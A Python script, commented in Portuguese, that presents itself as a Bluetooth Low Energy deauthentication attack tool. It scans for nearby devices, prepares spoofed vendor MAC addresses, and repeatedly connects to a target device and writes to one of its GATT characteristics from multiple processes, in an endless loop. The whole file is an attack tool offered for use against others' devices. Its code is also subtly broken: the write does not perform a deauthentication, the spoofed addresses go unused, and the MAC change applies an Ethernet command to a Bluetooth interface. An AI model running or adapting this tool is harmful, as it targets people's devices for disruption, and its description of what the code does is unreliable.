import subprocess
import multiprocessing
import time
import os
import asyncio
from dotenv import load_dotenv
from rich import print
from rich.console import Console
from utils.macaddress_gen import generate_mac_address
from bleak import BleakClient, BleakScanner

load_dotenv()
TARGET_DEVICE_MAC = os.getenv('TARGET_DEVICE_MAC')
interface = os.getenv('INTERFACES')

console = Console()
max_threads = 10
threads_count = min(multiprocessing.cpu_count(), max_threads)

# Verificação de interface
if not interface:
    console.print("[red] Interface de Bluetooth não encontrada. Verifique o arquivo .env.")
    exit(1)

# [ OUI Numbers for Mac Address ]
SPOOFED_MACS = [
    generate_mac_address("Apple"),
    generate_mac_address("HP"),
    generate_mac_address("Google"),
    generate_mac_address("Samsung"),
    generate_mac_address("Sony"),
    generate_mac_address("LG")
]

# BLE Deauthentication usando Bleak
async def deauth_Method_BLE(target_addr, packages_size):
    try:
        async with BleakClient(target_addr) as client:
            await client.connect()
            console.print(f"[green] Conectado ao dispositivo {target_addr}")

            # Simula envio de pacotes para desconectar o dispositivo
            for _ in range(packages_size):
                await client.write_gatt_char("00002a37-0000-1000-8000-00805f9b34fb", b'\x01')
                await asyncio.sleep(0.1)  # Intervalo entre pacotes

            console.print("Deauthentication request sent successfully.")
    except Exception as e:
        console.print(f"[red] Falha ao enviar solicitação de deauth: {str(e)}")

async def scan_devices():
    devices = await BleakScanner.discover()
    console.print("[blue] Dispositivos detectados:")
    for device in devices:
        console.print(f"{device.address} - {device.name}")
    return devices

def change_mac_address(interface, mac_address):
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['ifconfig', interface, 'hw', 'ether', mac_address])
    subprocess.call(['ifconfig', interface, 'up'])
    time.sleep(1)  # Pequena espera para estabilidade

def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=1):
    for i in range(start_time, 0, -1):
        console.print(f'[red] :rocket: Iniciando ataque Deauth em {i}')
        time.sleep(1)
        console.clear()
    console.print('[red] :rocket: Iniciando')

    # Multiprocessing pool para iniciar o ataque
    with multiprocessing.Pool(processes=threads_count) as pool:
        results = [pool.apply_async(asyncio.run, args=(deauth_func(target_addr, packages_size),)) for _ in range(threads_count)]
        [result.get() for result in results]

if __name__ == '__main__':
    try:
        # Scan de dispositivos antes de iniciar o ataque
        console.print("[yellow] Escaneando dispositivos BLE...")
        asyncio.run(scan_devices())

        while True:
            _kick_(deauth_Method_BLE, TARGET_DEVICE_MAC, 10, threads_count, 1)
            console.print("[cyan] Reiniciando ataque em 10s")
            time.sleep(10)
    except KeyboardInterrupt:
        console.print('\n[red] :fax: Ataque abortado pelo usuário.')
        exit()
